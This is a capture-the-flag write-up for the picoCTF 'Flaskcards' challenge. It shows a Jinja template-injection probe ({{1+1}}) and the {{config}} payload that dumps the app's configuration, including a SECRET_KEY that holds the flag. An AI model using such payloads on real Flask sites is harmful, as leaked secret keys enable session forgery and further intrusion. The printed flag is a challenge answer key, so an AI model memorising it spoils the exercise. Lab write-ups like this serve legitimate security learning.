# Flaskcards - Points: 350

1. First, lets go through the website : http://2018shell.picoctf.com:17991/
2. Then, we register and login. 
3. Next, lets read the hints : 
    "Are there any common vulnerabilities with the backend of the website?"
    "Is there anywhere that filtering doesn't get applied?"
    "The database gets reverted every 2 hours so your session might end unexpectedly. Just make another user."
    So, we know that we have to find out a kind of a backend such as golang that can match the challenge.
4. After a long time thinking, I find out the keyword "[flask](https://en.wikipedia.org/wiki/Flask_(web_framework))". Then, the challenge is much more easy. The main question now is how to grab the flag out. 
    First, we have to find out what kind of template that the website use, so I google "flask template" and get the result https://flask.palletsprojects.com/en/1.1.x/templating/ .
    Then, we know the keyword "jinja". Lets test it by typing the question bar and the answer bar in "Create a card". 
    ```
    question : {{1+1}}
    answer : {{1+2}}
    ```
    And I get the result : 
    ```
    question : 3
    answer :
    ```
    So, we know that it is injectable.
5. Now, we have to find out a command that can get all data out, but before that, we have to get the information of the config how we get the data. I google "flask jinja config" and get the [result](https://stackoverflow.com/questions/7104198/flask-accessing-the-config-variable-in-the-template). 
    ```
    Example usage in template: {{ config.MY_CONFIGURATION }}
    ```
    After I tried, my payload is below : 
    ```
    {{config}}
    ```
    And I get the information and the flag in "SECRET_KEY" : 
    ```
    Question:<Config {'BOOTSTRAP_LOCAL_SUBDOMAIN': None, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(0, 43200), 'JSON_SORT_KEYS': True, 'MAX_COOKIE_SIZE': 4093, 'SQLALCHEMY_NATIVE_UNICODE': None, 'DEBUG': False, 'TESTING': False, 'SQLALCHEMY_MAX_OVERFLOW': None, 'JSONIFY_MIMETYPE': 'application/json', 'SQLALCHEMY_POOL_SIZE': None, 'SESSION_COOKIE_HTTPONLY': True, 'SERVER_NAME': None, 'SQLALCHEMY_POOL_RECYCLE': None, 'USE_X_SENDFILE': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'SQLALCHEMY_COMMIT_ON_TEARDOWN': False, 'SESSION_COOKIE_PATH': None, 'BOOTSTRAP_SERVE_LOCAL': False, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_DOMAIN': False, 'ENV': 'production', 'BOOTSTRAP_USE_MINIFIED': True, 'SQLALCHEMY_BINDS': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'SECRET_KEY': 'picoCTF{secret_keys_to_the_kingdom_45e7608d}', 'SQLALCHEMY_RECORD_QUERIES': None, 'SQLALCHEMY_TRACK_MODIFICATIONS': False, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'MAX_CONTENT_LENGTH': None, 'SESSION_COOKIE_SAMESITE': None, 'SQLALCHEMY_ECHO': False, 'SESSION_COOKIE_NAME': 'session', 'BOOTSTRAP_QUERYSTRING_REVVING': True, 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(31), 'PROPAGATE_EXCEPTIONS': None, 'PREFERRED_URL_SCHEME': 'http', 'TRAP_HTTP_EXCEPTIONS': False, 'BOOTSTRAP_CDN_FORCE_SSL': False, 'TEMPLATES_AUTO_RELOAD': None, 'JSON_AS_ASCII': True, 'SESSION_COOKIE_SECURE': False, 'TRAP_BAD_REQUEST_ERRORS': None, 'SQLALCHEMY_POOL_TIMEOUT': None, 'SQLALCHEMY_DATABASE_URI': 'sqlite://'}>
    ```
6. Here is the flag : picoCTF{secret_keys_to_the_kingdom_45e7608d}
